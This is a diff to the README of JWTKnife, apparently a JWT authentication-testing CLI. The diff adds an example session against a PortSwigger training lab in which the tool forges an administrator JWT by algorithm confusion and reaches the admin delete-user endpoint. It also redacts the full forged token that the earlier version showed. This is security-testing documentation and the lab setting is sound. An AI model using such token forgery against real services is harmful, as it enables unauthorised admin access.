@@ -1,3 +1,5 @@
+#### JWTKnife
+
 JWTKnife is an interactive CLI tool for testing JWT-based authentication and authorization.
 
 It inspects a JWT, sends baseline requests, and tests common JWT weaknesses such as:
@@ -22,19 +24,10 @@ JWTKnife requires the following tools:
 
 Docker is invoked automatically by JWTKnife when needed. You do not need to run sig2n manually.
 
-Usage:
+### Example Use  
+*(PortSwigger Lab: JWT authentication bypass via algorithm confusion with no exposed key)*
 
-Run the tool and follow the prompts:
-
-./jwtknife
-
-You will be prompted to:
-- Provide a JWT (paste or load from file)
-- Choose where the JWT is sent
-- Define baseline endpoints
-- Select which tests to run
-
-Example Use (Port Swigger Lab: JWT authentication bypass via algorithm confusion with no exposed key)
+```text
 % ./jwtknife
 jwtknife – JWT auth testing wizard
 
@@ -62,9 +55,9 @@ Where is the JWT sent?
   3) Custom header
 Choose [1-3]: 2
 Cookie name: session
-Unauthenticated URL (accessible without any JWT): https://<lab-id>.web-security-academy.net              
-Authenticated URL (accessible with the provided JWT): https://<lab-id>.web-security-academy.net
-Privilege-escalation target URL (admin or higher-privilege endpoint): https://<lab-id>.web-security-academy.netdelete?username=carlos
+Unauthenticated URL (accessible without any JWT): https://<lab-id>.web-security-academy.net
+Authenticated URL (accessible with the provided JWT): https://<lab-id>.web-security-academy.net/my-account?id=wiener
+Privilege-escalation target URL (admin or higher-privilege endpoint): https://<lab-id>.web-security-academy.net/admin/delete?username=carlos
 
 Phase 1: JWT auth attacks
 
@@ -73,9 +66,7 @@ Attack: alg-confusion-sig2n
 Note: admin access via algorithm confusion with recovered RSA key (sig2n)
 
 Forged JWT:
-eyJhbGciOiJIUzI1NiIsImtpZCI6IjIzZTRhZjU0LTNiOTAtNGRjNi05ZTljLTYyODQ4ZGRhZGY2MyJ9.eyJleHAiOjE3NzA3MTMwNzcsImlzcyI6InBvcnRzd2lnZ2VyIiwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.DevsHujxCgXJc9mWGDtyAgfUdtAP89_VIDA229TtzWo
+eyJhbGciOiJIUzI1NiIsImtpZCI6IjIzZTRhZjU0LTNiOTAtNGRjNi05ZTljLTYyODQ4ZGRhZGY2MyJ9.<payload>.<signature>
 
 HTTP request / response for successful step:
 {Status:302 BodyLen:0 Duration:1.29833325s Err:}
-
-
